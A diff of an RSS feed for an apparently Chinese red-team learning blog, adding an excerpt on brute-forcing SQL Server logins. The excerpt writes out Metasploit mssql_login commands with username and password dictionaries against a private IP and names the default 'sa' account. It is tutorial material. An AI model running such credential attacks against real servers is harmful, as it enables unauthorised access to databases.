@@ -1,9 +1,36 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:35:09 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>权限提升</title><link>https://P7IVESC.github.io/post/quan-xian-ti-sheng.html</link><description>## 权限提升基础
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>P7IVESC's blog</title><link>https://P7IVESC.github.io</link><description>知其黑，守其白。一个网安小白的红队实战、靶场复盘与学习笔记。技术交流请备注来源：emhlcGluZzA1MDc=</description><copyright>P7IVESC's blog</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/237383456?v=4&amp;size=200</url><title>avatar</title><link>https://P7IVESC.github.io</link></image><lastBuildDate>Fri, 06 Nov 2026 03:44:26 +0000</lastBuildDate><managingEditor>P7IVESC's blog</managingEditor><ttl>60</ttl><webMaster>P7IVESC's blog</webMaster><item><title>权限提升</title><link>https://P7IVESC.github.io/post/quan-xian-ti-sheng.html</link><description>## 权限提升基础
 
 在Windows和Linux中，不同的进程和服务由不同用户权限或服务权限运行。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/quan-xian-ti-sheng.html</guid><pubDate>Fri, 06 Nov 2026 03:34:47 +0000</pubDate></item><item><title>SQL server命令执行</title><link>https://P7IVESC.github.io/post/SQL%20server-ming-ling-zhi-xing.html</link><description>前期渗透可以参考SQL server口令爆破
 
-“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/SQL%20server-ming-ling-zhi-xing.html</guid><pubDate>Fri, 06 Nov 2026 03:33:31 +0000</pubDate></item><item><title>Redis渗透</title><link>https://P7IVESC.github.io/post/Redis-shen-tou.html</link><description>## Redis未授权访问漏洞
+“存储过程”：其实质就是一个“集合”，那么是什么样的集合呢，就是存储在SQL server中预先定义好的“SQL语句集合”，说的更直白一些就是使用T-SQL语言编写好的各种小脚本共同组成的集合体，我们称之为“存储过程”。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/SQL%20server-ming-ling-zhi-xing.html</guid><pubDate>Fri, 06 Nov 2026 03:33:31 +0000</pubDate></item><item><title>SQL server口令爆破</title><link>https://P7IVESC.github.io/post/SQL%20server-kou-ling-bao-po.html</link><description>```
+工具：hydra、超级弱口令爆破工具、metasploit
+```
+
+## 工具：metasploit
+
+```bash
+msf &gt; use auxiliary/scanner/mssql/mssql_login （使用mssql_login 模块） 
+msf auxiliary(mssql_login) &gt; show options （查看选项） 
+msf auxiliary(mssql_login) &gt; set RHOSTS 10.107.0.64（目标） 
+msf auxiliary(mssql_login) &gt; set USER_FILE /root/username.txt（用户名字典） 
+msf auxiliary(mssql_login) &gt; set PASS_FILE /root/pass.txt（密码字典文件） 
+msf auxiliary(mssql_login) &gt; exploit（开始）
+```
+
+字典文件我放在密码集里面了
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/20adc0e0d2ed.webp)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e550cdbb885c.png)
+
+![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/62e27bf1c684.webp)
+
+## 工具：超级弱口令爆破工具
+
+sa是SuperAdministrator的简称，
+
+Sqlserver的默认管理员帐户。</description><guid isPermaLink="true">https://P7IVESC.github.io/post/SQL%20server-kou-ling-bao-po.html</guid><pubDate>Fri, 06 Nov 2026 03:32:55 +0000</pubDate></item><item><title>Redis渗透</title><link>https://P7IVESC.github.io/post/Redis-shen-tou.html</link><description>## Redis未授权访问漏洞
 
 ## Redis本地检查
 
